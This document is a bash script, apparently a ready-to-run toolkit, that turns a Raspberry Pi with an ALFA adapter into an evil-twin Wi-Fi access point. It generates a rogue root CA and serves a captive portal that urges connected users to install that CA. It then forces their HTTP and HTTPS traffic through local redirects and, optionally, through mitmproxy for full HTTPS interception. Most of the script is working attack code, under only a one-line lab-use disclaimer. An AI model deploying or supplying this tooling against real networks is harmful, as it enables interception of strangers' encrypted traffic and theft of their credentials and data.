#!/usr/bin/env bash
#
# WiEvilWithAlfa.sh
#
# A mega-wizard combining:
# 1) ALFA AC1900 (RTL8814AU) driver installation (morrownr/8814au)
# 2) Malicious AP creation with Root CA + captive portal
# 3) NAT, optional mitmproxy
# 4) Option to place ALFA in monitor mode instead (for packet injection)
#
# Usage: sudo ./WiEvilWithAlfa.sh
#
# DISCLAIMER: Educational or authorized lab use only.

set -euo pipefail

function print_info() {
  echo -e "\\n[INFO] $1\\n"
}

# 1. Must be root.
if [[ "$(id -u)" -ne 0 ]]; then
  echo "[ERROR] Script must run as root or with sudo."
  exit 1
fi

# 2. Basic system check for Debian Bookworm / RPi OS
if ! grep -q 'bookworm' /etc/os-release 2>/dev/null; then
  echo "[WARNING] This script is designed for Debian Bookworm or RPi OS Bookworm. Continuing anyway..."
fi

# 3. Ask user if they'd like to install the ALFA driver
read -r -p "Install ALFA AC1900 (RTL8814AU) driver via morrownr/8814au? (y/N): " do_alfa
if [[ "$do_alfa" =~ ^[Yy]$ ]]; then
  print_info "Installing dependencies, DKMS, etc..."
  apt-get update
  apt-get install -y dkms build-essential bc libelf-dev linux-headers-$(uname -r) raspberrypi-kernel-headers git
  
  print_info "Removing any old driver directories at /opt/rtl8814au..."
  rm -rf /opt/rtl8814au || true
  
  print_info "Cloning morrownr/8814au into /opt/rtl8814au..."
  cd /opt
  git clone https://github.com/morrownr/8814au.git rtl8814au
  cd rtl8814au
  
  print_info "Running install-driver.sh..."
  chmod +x install-driver.sh
  ./install-driver.sh
  
  print_info "Driver install attempted. Check 'dkms status' or 'modprobe 8814au'. 
Now you can have an ALFA interface named wlan1 or similar."
fi

# 4. Ask user if they'd like the ALFA in monitor mode or to use it for the malicious AP
# (If user doesn't have ALFA or doesn't want it, fallback to built-in Pi interface.)
read -r -p "Use ALFA for malicious AP (a) or monitor mode (m) or skip ALFA (s)? [a/m/s]: " alfa_mode
alfa_iface="wlan1"  # typical name for the ALFA if found

# 5. If they pick "m", put ALFA in monitor mode
if [[ "$alfa_mode" =~ ^[Mm]$ ]]; then
  print_info "Placing $alfa_iface in monitor mode for packet injection..."
  ifconfig "$alfa_iface" down || true
  iw dev "$alfa_iface" set type monitor
  ifconfig "$alfa_iface" up
  print_info "$alfa_iface is now in monitor mode. 
Use aircrack-ng or similar tools for injection. 
Exiting script now."
  exit 0
elif [[ "$alfa_mode" =~ ^[Ss]$ ]]; then
  print_info "Skipping ALFA usage. We'll default to built-in Pi wifi for malicious AP."
  alfa_iface=""  # blank means we won't use ALFA for AP
else
  # 'a' means user wants ALFA for malicious AP
  # We'll set $alfa_iface as the AP interface
  print_info "We'll use $alfa_iface for the malicious AP..."
fi

# 6. The rest is the EvilCAWizard logic
# We'll let user pick the interface for the AP: either $alfa_iface or the Pi built-in (wlan0).
ap_iface="wlan0"
if [[ -n "$alfa_iface" ]]; then
  ap_iface="$alfa_iface"
fi

print_info "Next: Malicious AP wizard. We'll generate root CA, captive portal, etc. 
We will use interface: $ap_iface"

### Prompting user input for AP
read -r -p "Enter AP SSID [MaliciousAP]: " AP_SSID
AP_SSID=${AP_SSID:-MaliciousAP}

read -r -p "Enter Wi-Fi channel (1,6,11,...) [6]: " AP_CHANNEL
AP_CHANNEL=${AP_CHANNEL:-6}

read -r -p "Enter 2-letter country code [US]: " AP_COUNTRY
AP_COUNTRY=${AP_COUNTRY:-US}

read -r -p "Enter WPA2 passphrase (>=8 chars) [TestPass123]: " AP_PSK
AP_PSK=${AP_PSK:-TestPass123}

read -r -p "Enter a name for the Root CA [EvilRootCA]: " CA_NAME
CA_NAME=${CA_NAME:-EvilRootCA}

### Now the Root CA + captive portal steps
print_info "Installing required packages: apache2, openssl, hostapd, dnsmasq, iptables..."
apt-get update
apt-get install -y apache2 openssl hostapd dnsmasq iptables

print_info "Unmasking hostapd if needed..."
systemctl unmask hostapd || true
systemctl enable hostapd

# Generating Root CA
print_info "Generating Root CA in /etc/evilca/${CA_NAME}.* ..."
mkdir -p /etc/evilca
cd /etc/evilca
openssl req -x509 -newkey rsa:2048 -keyout "${CA_NAME}.key" -out "${CA_NAME}.crt" -days 365 -nodes -subj "/CN=${CA_NAME}"
chmod 600 "${CA_NAME}.key"
cp "${CA_NAME}.crt" /var/www/html/ca.crt
cd ~

# Minimal captive page
print_info "Creating captive portal page in /var/www/html/index.html..."
cat <<EOF >/var/www/html/index.html
<!DOCTYPE html>
<html>
<head>
  <title>Malicious Hotspot - CA Install</title>
</head>
<body>
  <h1>Welcome to ${AP_SSID}</h1>
  <p>To ensure a 'secure' browsing experience, please install our <strong>Root CA</strong>:</p>
  <p><a href=\"ca.crt\" download>Download Root CA</a></p>
  <p>Once installed, your device will trust all certificates signed by it.</p>
  <hr/>
  <p><em>Disclaimer: For demonstration only. This is malicious!</em></p>
</body>
</html>
EOF

systemctl enable apache2
systemctl restart apache2

# Let user pick NAT or not
read -r -p "Enable NAT so AP clients can reach internet? (y/N): " do_nat

### systemd-networkd for the AP interface
# We'll default to 192.168.50.1/24 for the AP
print_info "Configuring systemd-networkd for ${ap_iface} => 192.168.50.1..."
mkdir -p /etc/systemd/network
cat <<EOF >/etc/systemd/network/30-${ap_iface}.network
[Match]
Name=${ap_iface}

[Network]
Address=192.168.50.1/24
EOF

systemctl enable systemd-networkd
systemctl restart systemd-networkd
ip link set "${ap_iface}" up || true
sleep 2

# hostapd.conf
print_info "Creating /etc/hostapd/hostapd.conf..."
cat <<EOF >/etc/hostapd/hostapd.conf
interface=${ap_iface}
driver=nl80211
ssid=${AP_SSID}
hw_mode=g
channel=${AP_CHANNEL}
country_code=${AP_COUNTRY}

wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=${AP_PSK}
rsn_pairwise=CCMP
EOF

if ! grep -q 'DAEMON_CONF=' /etc/default/hostapd; then
  echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' >>/etc/default/hostapd
else
  sed -i 's|^DAEMON_CONF=.*|DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"|' /etc/default/hostapd
fi

systemctl stop hostapd || true
systemctl start hostapd
sleep 2

systemctl status hostapd --no-pager || true

# dnsmasq for DHCP
print_info "Setting up dnsmasq for DHCP on ${ap_iface}..."
if [ -f /etc/dnsmasq.conf ]; then
  mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig.$(date +%s)
fi
cat <<EOF >/etc/dnsmasq.conf
interface=${ap_iface}
dhcp-range=192.168.50.50,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
EOF

systemctl enable dnsmasq
systemctl restart dnsmasq
systemctl status dnsmasq --no-pager || true

# iptables redirect 80 & 443 -> captive portal
print_info "Redirecting ports 80 & 443 to local Apache, so users see captive page..."
sed -i 's|^#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
sysctl -p || true

# Flush old rules
iptables -F
iptables -t nat -F
iptables -P FORWARD ACCEPT

iptables -t nat -A PREROUTING -i "${ap_iface}" -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
iptables -t nat -A PREROUTING -i "${ap_iface}" -p tcp --dport 443 -j DNAT --to-destination 192.168.50.1:80

mkdir -p /etc/iptables
iptables-save >/etc/iptables/iptables-rules.v4

if [ ! -f /etc/rc.local ]; then
  echo "#!/bin/sh -e" >/etc/rc.local
  echo "exit 0" >>/etc/rc.local
  chmod +x /etc/rc.local
fi
if ! grep -q "iptables-restore < /etc/iptables/iptables-rules.v4" /etc/rc.local; then
  sed -i '/^exit 0/i iptables-restore < /etc/iptables/iptables-rules.v4' /etc/rc.local
fi

# NAT?
if [[ "$do_nat" =~ ^[Yy]$ ]]; then
  print_info "Enabling MASQUERADE NAT for outgoing traffic on eth0..."
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  iptables-save >/etc/iptables/iptables-rules.v4
else
  print_info "Skipping NAT. Clients only see local captive portal on ${ap_iface}."
fi

# Ask about mitmproxy
read -r -p "Install & configure mitmproxy for full HTTPS interception? (y/N): " do_mitm
if [[ "$do_mitm" =~ ^[Yy]$ ]]; then
  print_info "Installing mitmproxy..."
  apt-get update
  apt-get install -y mitmproxy

  print_info "Removing captive 443->80 rule, adding 443->8081 for mitmproxy..."
  iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 443 -j DNAT --to-destination 192.168.50.1:80 || true
  iptables -t nat -A PREROUTING -i "${ap_iface}" -p tcp --dport 443 -j REDIRECT --to-port 8081
  iptables-save >/etc/iptables/iptables-rules.v4

  cat <<EOF

[INFO] To run mitmproxy:
  sudo mitmproxy --mode transparent -p 8081

**Navigation** in mitmproxy:
  - Up/Down: select flows
  - Enter: inspect flow
  - Left/Right or Tab: switch request/response
  - q or Esc: go back
  - Shift+Q: quit
  - ?: help

Ensure clients trust your CA at http://192.168.50.1/ca.crt
EOF
fi

print_info "All done!
1) We used interface: ${ap_iface} for the malicious AP (ALFA or built-in).
2) Root CA in /etc/evilca/${CA_NAME}.(key|crt), served at http://192.168.50.1/ca.crt
3) Captive portal forcing all HTTP/HTTPS -> local Apache, or mitmproxy if chosen.
4) If NAT is on, clients can get real internet after removing the captive portal redirection or adjusting rules.
5) If you put ALFA in monitor mode earlier, that portion won't run hostapd. 
6) Reboot recommended: sudo reboot

Enjoy your integrated Evil Wi-Fi + ALFA driver environment!"
